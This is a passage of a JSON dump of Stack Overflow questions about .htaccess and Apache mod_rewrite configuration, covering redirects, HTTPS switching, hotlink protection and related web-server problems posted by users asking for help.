^(.*) /partners/default.php?code=$1 [R=301,L]\n</code></pre>\n\n<p>Similarly, these lines check for the non-existence of a directory and redirect the user somewhere else if the directory isn't found.</p>\n\n<p>Here's what's happening: say I visit <code>www.example.com/andyf</code> and the <code>andyf</code> folder doesn't exist in the <code>partners</code> directory, then I'm taken to <code>www.example.com/partners/default.php?code=andyf</code></p>\n\n<p>So far, so good.</p>\n\n<p>However, if the <code>andyf</code> directory is created later I'm still taken to the <code>default.php</code> page, even though the correct directory exists now. This is down to the 301 redirect which has been put in place.</p>\n\n<p>What confuses me is that if the .htaccess file is <a href=\"http://en.wikipedia.org/wiki/Htaccess#Advantages\" rel=\"nofollow\">read on every request</a> then why isn't redirect A overwriting redirect B? Or is the 301 redirect taking place, as I suspect, before the .htaccess file is read?</p>\n"},{"tags":[".htaccess","mod-rewrite","query-string"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12328891,"title":"htaccess: redirect to a same page, but with different query string value","body":"<p>I have a page with query string which I would like to redirect to same page with different query string value:</p>\n\n<p><code>www.mysite.com/pages/page.php?id=5</code> (this is the old page)<br />\n<code>www.mysite.com/pages/page.php?id=7</code> (this is the new page that need to redirect to)</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{QUERY_STRING} ^id=5$ [NC]\n\nRewriteRule ^pages/page\\.php$ pages/page.php?id=7 [R=301,L]\n</code></pre>\n\n<p>It doesn't work. Could anybody help me? Thanks!</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12327256,"title":"htaccess url destroyed results","body":"<p>I'm trying to fix some strange or destroyed results with my web url, if I add any char after index.php/:</p>\n\n<pre><code>http://domain/index.php/?\n</code></pre>\n\n<p>How can I fix this? Thank you!</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12325272,"title":"htaccess: Why 301 redirect doesn't work for single page but works for all pages in general?","body":"<p>It works for all page:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteBase /\nRewriteRule (.*) http://www.newdomain.ru/somepage/ [R=301,L]\n</code></pre>\n\n<p>But I would like to redirect single page. This code doesn't do redirect:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteBase /\nRewriteRule ^thePageOnOldDomain.php?someGetParameter=1 http://www.newdomain.ru/somepage/ [R=301,L]\n</code></pre>\n"},{"tags":["php","apache",".htaccess","php.ini","httpd.conf"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":136,"score":0,"question_id":12325618,"title":"Difference between httpd.conf, php.ini and .htaccess","body":"<p>I am about to start learning Apache. All resources I am looking into, mention either <code>php.ini</code>, or <code>.htaccess</code> or <code>httpd.conf</code> files for setting configurations and stuff. But none of them are clear on the difference between these 3 files. Can anyone explain the difference and their usage?</p>\n"},{"tags":["apache",".htaccess","hotlinking"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12324226,"title":"How to protect images from being hotlinked?","body":"<p>I have tried the below code in htaccess to stop my images from being hotlinked, but it is not working.</p>\n\n<pre><code>SetEnvIfNoCase Referer \"^http://www.example.com/\" locally_linked=1\nSetEnvIfNoCase Referer \"^http://www.example.comm$\" locally_linked=1\nSetEnvIfNoCase Referer \"^http://example.com/\" locally_linked=1\nSetEnvIfNoCase Referer \"^http://example.com$\" locally_linked=1\nSetEnvIfNoCase Referer \"^$\" locally_linked=1\n&lt;FilesMatch \"\\.(gif|png|jpe?g|css|js)$\"&gt;\n  Order Allow,Deny\n  Allow from env=locally_linked=1\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>Can anyone help me with how to prevent hotlinking?</p>\n"},{"tags":[".htaccess","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12322893,"title":".htaccess rewrite howto","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/11669695/redirect-using-htaccess-file\">redirect using htaccess file</a>  </p>\n</blockquote>\n\n\n\n<p>Hello there (very simple question),</p>\n\n<p>How to map</p>\n\n<pre><code>mydomain/language/somepage\n</code></pre>\n\n<p>To</p>\n\n<pre><code>mydomain/somepage.php\n</code></pre>\n\n<p>The physical page being of course mydomain/somepage.php</p>\n\n<p>The idea is that /en/somepage, /fr/somepage, /de/somepage all point to somepage.php (I intend to get the language passed in URL with php).</p>\n\n<p>More specifically I would like that apache understands to SUPPRESS either /fr /en /de from the request URI and deliver the right document, my physical tree not having any /fr /en /de subdirectory : i.e.</p>\n\n<pre><code>root/fr/subdir/subsubdir/somepage\n</code></pre>\n\n<p>should be pointing to</p>\n\n<pre><code>root/subdir/subsubdir/somepage.php\n</code></pre>\n\n<p>Thank you !</p>\n\n<p><strong>* EDIT *</strong></p>\n\n<p>So, I think I get a better idea how URL rewrites work so, I've come to this. It's broken and I actually suck at regular expressions so if somebody could help me sort it out I would love it ! ^^</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond ^[a-z]{2}$/%{REQUEST_FILENAME}\\.php -f\nRewriteRule ^([a-z]{2})/(.*)$ $2.php?lang=$1\n</code></pre>\n\n<p>Explanations : the URL will be passed to apache in the form of</p>\n\n<pre><code>root/(fr|de|en|whatever)/document\n</code></pre>\n\n<p>and is (should be) rewritten in the form of/passed to php</p>\n\n<pre><code>root/document.php?lang=(fr|de|en|whatever)\n</code></pre>\n\n<p>I hope it's clear enough, TYVM !</p>\n\n<p>Also, being able to pass subdirectories as well like</p>\n\n<pre><code>root/(fr|de|en|whatever)/sub/.../document\n</code></pre>\n\n<p>would be very nice. I need further explanations on htaccess for constants for this like %{REQUEST_FILENAME}, %{REQUEST_URI}, ...</p>\n\n<p>TY</p>\n"},{"tags":["javascript",".htaccess","parsing","dns"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12322819,"title":"Capturing hostname across multiple sites with Javascript","body":"<p>I'm trying to capture the hostname, without 'www.\" or '.com'. At this point i'm able to capture what i'm looking for using the following:</p>\n\n<pre><code>var host = document.location.host;\nvar parts = host.split('\\.');\nvar result = parts[1];\nvar partner = result+\"_block\";\n</code></pre>\n\n<p>This will be used across 20+ sites and that number will grow, my concern is that some sites might not use redirects to \"www\" and if the domain appears as example.com vs www.example.com then I will be capturing \"com\" instead of \"example\". Is there any better solution for resolving this without using conditional statements?</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>There is no standard way of doing this from what I can tell, so I just added a conditional statement like so:</p>\n\n<pre><code>var result;\nvar host = document.location.hostname;\nvar parts = host.split('\\.');\nif(parts[0] == 'www' || 'beta' || 'm'){\n    result = parts[1]\n}else{\n    result = parts[0]\n}\n</code></pre>\n"},{"tags":["php","apache",".htaccess","lamp"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":11425181,"title":"LAMP - Multisite Platform Performance Improvements","body":"<p>I'm working on a platform which is serving multiple websites for a company that currently has over 80 websites. The sites are running fine (for now) with pages appearing in less than 2-3 seconds. However the sites are growing with more viewers each day, with 1 site in particular receiving thousands of visitors daily.</p>\n\n<p>I currently have the multisite structure setup using LAMP with a .htaccess file controlling requests for physical files for each site, and then a rewrite to work out which page to show depending on the host and request uri.</p>\n\n<p>I haven't been in this situation before with a multisite setup all controlled by the single codebase with separate templates and separate file bases. I'm hoping someone else could advise me what I could do to improve performance before it's too late.</p>\n\n<p>From my knowledge, having 80+ websites specified in the .htaccess file isn't really good for performance but I could be wrong. I assume if there is something I can do directly in the Apache vhost file that would be better for performance?</p>\n\n<p>Note:\n* I only use the .htaccess file to detect if a physical file exists before going to the rewrite script, to prevent PHP from handling all the file requests.</p>\n"}]}
{"total":14528,"page":19,"pagesize":100,"questions":[{"tags":[".htaccess","url-rewriting","socialengine"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":983,"score":0,"question_id":4977992,"title":"Socialengine url rewriting","body":"<p>I want to let users access their pages by typing the url <a href=\"http://www.mysite.com/username\" rel=\"nofollow\">http://www.mysite.com/username</a></p>\n\n<p>So to redirect <a href=\"http://www.mysite.com/username\" rel=\"nofollow\">http://www.mysite.com/username</a> TO <a href=\"http://www.mysite.com/profile/username\" rel=\"nofollow\">http://www.mysite.com/profile/username</a> </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  Options +FollowSymLinks\n  RewriteEngine On\n\n\n\n  # Get rid of index.php\n  RewriteCond %{REQUEST_URI} /index\\.php\n  RewriteRule (.*) index.php?rewrite=2 [L,QSA]\n\n\n  # Rewrite all directory-looking urls\n  RewriteCond %{REQUEST_URI} /$\n  RewriteRule (.*) index.php?rewrite=1 [L,QSA]\n\n\n\n  # Try to route missing files\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} public\\/ [OR]\n  RewriteCond %{REQUEST_FILENAME} \\.(jpg|gif|png|ico|flv|htm|html|php|css|js)$\n  RewriteRule . - [L]\n\n\n\n  # If the file doesn't exist, rewrite to index\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteRule ^(.*)$ index.php?rewrite=1 [L,QSA]\n\n\n\n   RewriteRule ^([A-Za-z_-]+)$ /profile/$1 [R] \n\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Why wont this work?</p>\n"},{"tags":["apache",".htaccess","ifdefine"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":297,"score":2,"question_id":11073752,"title":"Apache IfDefine conditionals in .htaccess","body":"<p>my dev setup: Mac OSX 10.7.4 / Apache 2.2.21 / PHP 5.3.10</p>\n\n<p>i wish to add conditional logic to my .htaccess files depending on dev vs live environment.  for example i want to have authentication on the live server but not on the dev server. i have in my <strong>httpd.conf</strong></p>\n\n<p><code>SetEnv DEV 1</code></p>\n\n<p>i have confirmed that this var is set by checking the output from <strong>phpinfo()</strong>.  then in my <strong>.htaccess</strong> file</p>\n\n<pre><code>&lt;IfDefine !DEV&gt;\nAuthType Basic\nAuthName \"password protected\"\nAuthUserFile /path/to/.htpasswd\nRequire valid-user\n&lt;/IfDefine&gt;\n</code></pre>\n\n<p>but i am still prompted for password on my local dev.  it appears that the <strong>DEV</strong> variable is not available to <strong>.htaccess</strong>.  i do have <strong>AllowOverride All</strong> set in my <strong>httpd.conf</strong> for my doc root. any ideas? thanks.</p>\n"},{"tags":["osx",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12321491,"title":"htaccess redirect localhost","body":"<p>I have </p>\n\n<pre><code>&lt;link href=\"/smarter-computing/us/en/sc-mobile.css\" type=\"text/css\"/&gt;\n&lt;script src=\"/smarter-computing/js/sc-common.js?fileversion-r21\" type=\"text/javascript\"&gt;//&lt;/script&gt;\n</code></pre>\n\n<p>When I am working on these files locally I have to keep append <code>//localhost/~vc/</code> before the path for JS and CSS files. I don't want to keep copy/pasting this path for the following and every <code>&lt;img&gt;</code> links in my code.<br>\nHow can I use htaccess to redirect all url's pointing to <code>//localhost/smarter-computing/</code> or <code>/smarter-computing/</code> to append this path <code>//localhost/~vc/</code> before my <code>/smarter-computing</code> path.</p>\n\n<p>Thank you,</p>\n\n<p>Vishwas</p>\n"},{"tags":["php","apache",".htaccess","cache-control"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12318778,"title":"PHP Cache Headers with CDN","body":"<p>I am trying the php header() function to set caching headers to my page. I have a CDN that caches the http requests. What I am trying to achieve here is that the CDN should cache my page for 2 days, and the browser should check for new version to the CDN every 5 minutes.</p>\n\n<pre><code>Cache-Control: max-age=300, s-maxage=172800, public\n</code></pre>\n\n<p>Does this avoe cache header work?</p>\n"},{"tags":["regex",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12318639,"title":".htaccess URLRewrite rule - regular expression","body":"<p>I'm in need of a rewrite rule for a site of mine.</p>\n\n<p>I have the following type of URLS:</p>\n\n<pre><code>http://bag-saver.com/store/category/yellow-bags/?brand=TedBaker\n</code></pre>\n\n<p>But I would like that to read:</p>\n\n<pre><code>http://bag-saver.com/store/category/yellow-bags-by-tedbaker/\n</code></pre>\n\n<p>This is what I think should work:</p>\n\n<pre><code>RewriteRule ^-(.*) ?brand=$1\n</code></pre>\n\n<p>(it doesn't)</p>\n\n<p>But then in addition, the <code>?brand</code> parameter could actually appear as an <code>&amp;parameter</code> - e.g. <code>?word=clutch&amp;brand=TedBaker</code>.</p>\n\n<p>To summarise - I would like the brand parameter to be made into the final part of the static URL, preceded by the word 'by'. I would like this to work regardless of where the brand parameter appears in the URL string.</p>\n\n<p>Here is the current .htaccess file:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n\n\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>And here are all the URLs this needs to apply to:</p>\n\n<pre><code>http://bag-saver.com/store/category/black-bags/?brand=Jaeger\nhttp://bag-saver.com/store/category/black-bags/?brand=Jaeger&amp;word=Cross%20Body\nhttp://bag-saver.com/store/category/black-bags/?word=Cross+Body&amp;brand=Jaeger\n</code></pre>\n\n<p>Above need to be converted to /store/category/black-bags-by-jaeger/ or /store/category/black-bags-by-jaeger/?word=Cross%20Body (for 2nd and 3rd options).</p>\n\n<p>I also have this:\n<a href=\"http://bag-saver.com/store/search/?brand=Jaeger\" rel=\"nofollow\">http://bag-saver.com/store/search/?brand=Jaeger</a> which needs to be converted to /store/search/bags-by-jaeger/.</p>\n"},{"tags":[".htaccess","netbeans","comments","toggle","syntax-highlighting"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12319638,"title":"\"Toggle Comment\" for .htaccess files in Netbeans 7.2?","body":"<p>Is there any way to get the <strong><em>Toggle Comment</em></strong> command working for .htaccess files in Netbeans 7.2? I already got used to the according keyboard shortcuts in php, css, js and css files. As syntax highlighting is supported in 7.2, maybe it's possible to achieve that by changing the config?</p>\n\n<p><img src=\"http://i.stack.imgur.com/zRU58.png\" alt=\"enter image description here\"></p>\n"},{"tags":[".htaccess","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12318003,"title":"Non existing subdomains getting indexed in google ?","body":"<p>On my site <code>example.com</code>, there are no such domains as <code>www2.example.com</code>, <code>ww4.example.com</code> but google search is showing such pages.</p>\n\n<p>Apparently the site do have such pages (duplicate of <code>example.com</code>) so how to stop this ? it looks to be some <code>http</code> access problem</p>\n"},{"tags":[".htaccess","magento","redirect","seo","magento-1.4"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":131,"score":0,"question_id":12317177,"title":"Magento redirects to base url using 302, how do I get it to use 301","body":"<p>I've notice in firebug that the non-www version of my magento store redirects to the www version using <code>302</code>. For SEO purposes I want it to redirect using <code>301</code>.</p>\n\n<p><strong>How I tried to fix it</strong></p>\n\n<p>I went to the System > Configuration > General > Web > Url Options and my setting Redirect to Base URL if requested URL doesn't match it is set to Yes (there are only 2 options: Yes or No)<img src=\"http://i.stack.imgur.com/Wv4u3.jpg\" alt=\"Magento 1.4 URL Rewrite options\"></p>\n\n<p><strong>Imporantant notes</strong></p>\n\n<p>I'm using Magento v1.4.0.1\nMy <code>.htaccess</code> file contains the following, in regards to URL Rewrites:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    Options +FollowSymLinks\n    RewriteEngine on\n    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]\n    RewriteCond %{REQUEST_URI} !^/(media|skin|js)/\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_FILENAME} !-l\n    RewriteRule .* index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>How can I change the redirect method to <code>301</code>?</p>\n"},{"tags":["php",".htaccess","cakephp","cakephp-1.3"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":56,"score":-1,"question_id":12317990,"title":"Secure site folder using .htaccess","body":"<p>I am using cakephp for my new project.I want to secure my site with .htaccess.Here is what i want to achieve.</p>\n\n<p>If someone tries to go to my site url which is,for now www.sample.com.User should not get access without giving password or any other security method.How can i achieve this property?? Shall i eloberate this requirement??then please let me know.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["php",".htaccess","browser","https","ssl-certificate"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12317079,"title":"switching from  http to https  gives different errors on different browser?","body":"<p>I want to run few pages on <code>https</code> while all others pages run on <code>http</code></p>\n\n<p>I wrote below code in <strong>.htaccess</strong> and on <strong>config.inc.php</strong> file</p>\n\n<h3>.htaccess</h3>\n\n<pre><code>RewriteEngine on\nOptions +FollowSymLinks \nRewriteBase /\n\nRewriteRule ^login/?$ login.php [NC]\n\n# Rewrite non www to www.charityrummage.com\nRewriteCond %{HTTP_HOST} !^www\\.\nRewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n\n# Rewrite to https\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} /login [OR]\nRewriteCond %{REQUEST_URI} /do_login.php [OR]\nRewriteCond %{REQUEST_URI} /payment/?.*$ \nRewriteRule ^(.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L,QSA]\n\n# traffic to http://, except login.php and payment.php\nRewriteCond %{HTTPS} on\nRewriteCond %{REQUEST_URI} !(/login|/do_login.php|/payment)\nRewriteRule (.*) http://%{HTTP_HOST}%{REQUEST_URI} [R=301,L,QSA]\n</code></pre>\n\n<p>also made some changes in <strong>config.inc.php</strong> which is required and first file of the website</p>\n\n<h3>config.inc.php</h3>\n\n<pre><code>$ssl_page = array('login.php','do_login.php','payment.php');\n// Note: do_login.php is intermediate page\nif(in_array(trim($_SERVER['SCRIPT_NAME'],'/'),$ssl_page)){\n    define('PROTOCOL','https://');    \n }else{\n   define('PROTOCOL','http://');\n}\ndefine('DS','/');\ndefine('URL',PROTOCOL.$_SERVER['HTTP_HOST'].DS);\n// based on URL i made CSS and JS Path\n</code></pre>\n\n<p>here is the website link :</p>\n\n<blockquote>\n  <p><a href=\"http://www.charityrummage.com\" rel=\"nofollow\">http://www.charityrummage.com</a>.</p>\n</blockquote>\n\n<p>login page is ssl enabled : </p>\n\n<blockquote>\n  <p><a href=\"https://www.charityrummage.com/login\" rel=\"nofollow\">https://www.charityrummage.com/login</a></p>\n</blockquote>\n\n<h2>BUT</h2>\n\n<p>when I run the website, it gives different errors on different browsers  and its really annoying. below are the error description on different browsers</p>\n\n<h3>IE8</h3>\n\n<blockquote>\n  <p>it always prompt for security error and<br>\n   if i click on Yes then display everything fine except left panel<br>\n  if i click on NO then certificate error near web address but website works fine.</p>\n</blockquote>\n\n<h3>Chrome ( v :20.0.1132.8 )</h3>\n\n<blockquote>\n  <p>display multiple warning about css and js ( see in console ) in below format:</p>\n  \n  <p><strong>The page at <a href=\"https://www.charityrummage.com/login\" rel=\"nofollow\">https://www.charityrummage.com/login</a> ran insecure content\n  from <a href=\"http://www.charityrummage.com/css/reset.css\" rel=\"nofollow\">http://www.charityrummage.com/css/reset.css</a></strong></p>\n  \n  <p>but if you view source of <a href=\"https://www.charityrummage.com/login\" rel=\"nofollow\">login page</a> then you can see that every\n  <strong>css</strong> and <strong>js</strong> running with <code>https://</code></p>\n</blockquote>\n\n<h3>Firefox (v 16.0)</h3>\n\n<blockquote>\n  <p>it display lock sign ( secure ) just for few seconds and then gone away<br>\n   ( i m surprised it never prompt security alert for https )\n  but when we go with  <strong>page info -> media</strong> then many of images are coming  from <strong>http://</strong></p>\n</blockquote>\n\n<p>Will you please examine and tell me what is exact problem?</p>\n\n<p>One more thing i want to know.</p>\n\n<blockquote>\n  <p>if <code>https://</code> pages are not displaying properly then which one is responsible</p>\n</blockquote>\n\n<ul>\n<li>Operating system OR</li>\n<li>Browser OR</li>\n<li>server OR</li>\n<li>Programming issue OR</li>\n<li><p>SSL certificate issue</p>\n\n<p>and  at the end what is the solution of this problem?</p></li>\n</ul>\n\n<p>Thanks</p>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12314886,"title":".htacces is not working with CodeIgniter 1.7.3, php 5.3","body":"<p>I tried to hide the index.php with .htaccess, CI 1.7.3 and php 5.3 and got an error 404.\nBut it’s working fine on my development server which is having php 5.2 and rest of all are the same configuration, i developed my application with HMVC and my .htaccess is</p>\n\n<pre><code>    RewriteEngine on\n    Options -Indexes\n    RewriteBase /myapp/\n\n    RewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5})$\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ /myapp/index.php?/$1 [L] \n</code></pre>\n\n<p>Anybody suggest me the way how can i resolve this issue should i upgrade my CI version ?</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","codeigniter","google-api"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12315548,"title":"CodeIgniter 500 internal server error","body":"<p>I'm working on a website that manages personal informations about employees. And I'm using google Calendat API to manage their timesheet. I created a CodeIgniter project that displays, inserts, deletes and update events and it works. However, when I tried to integrate this with my website which is also based on CodeIgniter, insertion , deletion and update show a 500 internal server error. I read that this error may come from .htaccess. But I have the same .htaccess file for both of the two apps.\nHere is my .htaccess file :</p>\n\n<pre><code>Allow from localhost\nAllow from 127.0.0.1\nphp_flag allow_url_include 1\nDeny from all\n</code></pre>\n\n<p>For example , here is my function add_event (controller)</p>\n\n<pre><code> function add_event()\n    {   \n           $this-&gt;load-&gt;library('gcal');\n            $click_date = $this-&gt;input-&gt;post('start_date');\n            $date= explode(\"-\", $click_date);\n            $year= (int)$date[0];\n            $month= (int)$date[1];\n            $day= (int)$date[2]; \n            $title=$this-&gt;input-&gt;post('title');\n            $date_start = $this-&gt;unix_timestamp($year.'-'.$month.'-'.$day);\n\n\n            $params = array(\n            'calendarId'    =&gt; 'myLogin@gmail.com',\n            'allday'        =&gt; true, \n            'start'         =&gt; $date_start,\n            'end'       =&gt; $date_start,\n            'summary'       =&gt; $title,\n            'description'   =&gt; \"test\"\n        ); \n\n        $response = $this-&gt;gcal-&gt;eventInsert($params); \n                echo ' response';   \n\n        if($response)\n        {\n            echo \"true\";\n        } \n        else { echo \"false\"; }\n\n    }\n</code></pre>\n\n<p>Nothing is printed after `$response = $this->gcal->eventInsert($params);\nIn gcal.php, there is a problem with the second require:</p>\n\n<pre><code>require_once \"./application/third_party/google/src/apiClient.php\";\necho 'after require1 ';\nrequire_once \"./application/third_party/google/src/contrib/apiCalendarService.php\";\n</code></pre>\n\n<p>echo 'after require2';\n'after require2' isn't printed. And the only error according to Firebug is the 500 internal server error\n`\nCould anyone help me please?</p>\n\n<p>Thanks</p>\n"},{"tags":["apache",".htaccess","nginx","webserver","fastcgi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12312491,"title":".htacces-SetEnvIf To NGinx-fastcgi_param Conversion","body":"<p>I have below .htaccess settings along with my Apache website; now I am moving this in to Nginx. Thus I wonder how can I put below 'SetEnvIf' parmeters in .htaccess file to Nginx configuraiton? I think its by setting up 'fastcgi_param', please help me to do the conversion.</p>\n\n<pre><code>SetEnvIf HOST albany\\.mywebsite\\.com MAGE_RUN_CODE=w2760\nSetEnvIf HOST albany\\.mywebsite\\.com MAGE_RUN_TYPE=website\nSetEnvIf HOST alexandria\\.mywebsite\\.com MAGE_RUN_CODE=w1472\nSetEnvIf HOST alexandria\\.mywebsite\\.com MAGE_RUN_TYPE=website\nSetEnvIf HOST annarbor\\.mywebsite\\.com MAGE_RUN_CODE=w2933\nSetEnvIf HOST annarbor\\.mywebsite\\.com MAGE_RUN_TYPE=website\n</code></pre>\n\n<p>Thank You.</p>\n"},{"tags":[".htaccess","github"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":11441888,"title":"htacces for github commit hook url","body":"<p>I am trying to make use of github's commit hook url.</p>\n\n<p>I have added a url to a folder I am tring to hide from everyone except git hub via an htaccess file in the directory im trying to hide.</p>\n\n<pre><code>order deny,allow\ndeny from all\nallow from 50.57.128.197, sh2.rs.github.com, 108.171.174.178, sh3.rs.github.com\n</code></pre>\n\n<p>on my server i have the following error:</p>\n\n<pre><code>[error] [client 188.220.202.221] client denied by server configuration: xxx\n</code></pre>\n\n<p>Any thought on what I am doing wrong?</p>\n"},{"tags":[".htaccess","url","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12303957,"title":"clean url with mod_rewrite","body":"<p>I found several topics on mod_rewrite on stackoverflow but none them solved my problem. I also tried tutorial on this website <a href=\"http://edrackham.com/apache/beginners-mod_rewrite-tutorial/\" rel=\"nofollow\">http://edrackham.com/apache/beginners-mod_rewrite-tutorial/</a>\nI have been trying to use mod_rewrite to get clean url. For example:</p>\n\n<pre><code>  www.myweb.com/itemdetail.php?itemid=111234\n</code></pre>\n\n<p>to</p>\n\n<pre><code>  www.myweb.com/itemdetail/111234 or \n  www.myweb.com/itemdetail/iphone\n</code></pre>\n\n<p>This is my .htaccess file content.</p>\n\n<pre><code>   RewriteEngine On\n   RewriteCond %{REQUEST_FILENAME} !-d \n   RewriteCond %{REQUEST_FILENAME} !-f \n   RewriteCond %(REQUEST_FILENAME) !-l\n   RewriteRule ^(.*)$ index.php?url=$1 [QSA,L]\n</code></pre>\n\n<p>As suggested in stackoverflow, I added following rewriterule to above file</p>\n\n<pre><code>   RewriteRule ^itemdetail/([0-9]+)/$ itemdetail.php?itemid=$1 [NC,L]  \n</code></pre>\n\n<p>But this did not solve my problem. Any suggestion is appreciated. </p>\n"},{"tags":[".htaccess","url","subdomain"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12312906,"title":"How to call different index files for main domain and sub domins?","body":"<p>i have a site in the name of www.mysite.com. when the url is www.mysite.com,  i want to call index1.php file (this is my main domain). </p>\n\n<p>If the url is from sub domains like test1.mysite.com, test2.mysite.com then i want to call index2.php file.</p>\n\n<p>How to do it in htaccess? any help is greatly appreciated..</p>\n\n<p>Thanks in advance.!</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12305228,"title":"Apache .htaccess rewrite all urls to https home page with exceptions that rewrite to https current page","body":"<p>I am trying to rewrite ALL <a href=\"http://www.example.com/\" rel=\"nofollow\">http://www.example.com/</a>* urls to <a href=\"https://www.example.com/\" rel=\"nofollow\">https://www.example.com/</a> except some pages. I can get the catch all rewrite to work no problem:</p>\n\n<pre><code>RewriteCond %{SERVER_PORT} 80\nRewriteRule ^/?(.*) https://%{SERVER_NAME}/$1 [R,L]\n</code></pre>\n\n<p>However, if I try to add the exceptions before the catch all home page forward, they do not work. Also, if I just try add them by themselves, (commenting out the previous rule), they do not work.</p>\n\n<pre><code>RewriteCond %{SERVER_PORT} 80\nRewriteRule ^/?products/(.*) https://%{SERVER_NAME}/products/$1 [R,L]\n</code></pre>\n\n<p>So, there are a few pages on the site I want to have simple http->https rewrites. \nIf someone goes to <code>http://.../products</code> they should be forwarded to <code>https://.../products</code> for example.</p>\n\n<p>Also, I want to make sure whatever rule I have works for <code>www.example.com/products</code> and <code>example.com/products</code>.</p>\n"},{"tags":[".htaccess","backbone.js","slim"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":213,"score":0,"question_id":12262418,"title":"Backbone.js save gets '404 not found' on Slim.php","body":"<p>I have created a Backbone.js model and want to save an instance to my MySql database.</p>\n\n<pre><code>var Website = Backbone.Model.extend({\n    defaults: {   \n\n                \"title\":\"default title\"\n            },\n    urlRoot : './websites'\n});\n\n\nvar website = new Website();\nwebsite.save();​\n</code></pre>\n\n<p>I am using <a href=\"http://www.slimframework.com\" rel=\"nofollow\">Slim.php</a> to create a Restful API to my database. Here is the beginning of websites\\index.php:</p>\n\n<pre><code>&lt;?php\n\nrequire 'Slim/Slim.php';\n\n$app = new Slim();\n\n$app-&gt;get('/websites', 'getWebsites');\n$app-&gt;get('/websites/:id',  'getWebsite');\n$app-&gt;post('/websites', 'addWebsite');\n$app-&gt;put('/websites/:id', 'updateWebsite');\n$app-&gt;delete('/websites/:id',   'deleteWebsite');\n\n$app-&gt;run();\n</code></pre>\n\n<p>My save() triggers a POST which gets \"moved permanently\":</p>\n\n<blockquote>\n  <p>Request\n  URL:localhost/SAMPLE-CODES/backbone.js-mysql-reading-json/websites\n  Request Method:POST Status Code:301 Moved Permanently</p>\n</blockquote>\n\n<p>Then I see a second http request 